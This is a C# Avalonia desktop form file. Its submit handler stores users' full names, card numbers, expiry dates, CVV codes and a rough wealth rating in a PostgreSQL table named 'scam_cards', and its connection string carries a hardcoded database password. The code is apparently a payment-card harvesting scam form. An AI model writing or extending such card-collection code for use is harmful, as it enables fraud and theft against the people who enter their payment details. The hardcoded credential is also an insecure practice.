using Avalonia.Controls;
using Npgsql;
using System.Diagnostics;
using System;

namespace Forma
{
    public partial class MainWindow : Window
    {
        NpgsqlDataSource dataSource;
        public MainWindow()
        {
            var connectionString = "Host=localhost;Username=postgres;Password=admin;Database=forma";
            dataSource = NpgsqlDataSource.Create(connectionString);
            InitializeComponent();
        }

        private void Button_Click(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {

            Debug.WriteLine("DEBUG PROVERIT");

            if (CheckBox1.IsChecked == false)
            {
                Textik.IsVisible = true;
            }
            else
            {

                string kolvoDeneg = "nolic";
                if (RadioButton1.IsChecked == true)
                {
                    kolvoDeneg = "malo";
                }

                if (RadioButton2.IsChecked == true)
                {
                    kolvoDeneg = "sredne";
                }

                if (RadioButton3.IsChecked == true)
                {
                    kolvoDeneg = "mnogo";
                }


                try
                {

                    using (var cmd = dataSource.CreateCommand("INSERT INTO scam_cards (fio, number,mounth,year,cvv,skolkodeneg) VALUES ($1, $2, $3, $4, $5,$6)"))
                    {
                        cmd.Parameters.AddWithValue(Fio.Text);
                        cmd.Parameters.AddWithValue(Convert.ToInt64(Number.Text));
                        cmd.Parameters.AddWithValue(int.Parse(Mounth.Text));
                        cmd.Parameters.AddWithValue(int.Parse(Year.Text));
                        cmd.Parameters.AddWithValue(int.Parse(Cvv.Text));
                        cmd.Parameters.AddWithValue(kolvoDeneg);
                        cmd.ExecuteNonQuery();
                    }
                    new Window1().Show();
                }
                catch
                {
                    Durak2.IsVisible = true;
                }

               




            }

        }

        private void Button_Click_1(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            new Window2().Show();
            
        }

        private void Button_Click_2(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            new Window3().Show();
            
        }

        private void CheckBox_Click_3(object? sender, Avalonia.Interactivity.RoutedEventArgs e)
        {
            
        }
    }
}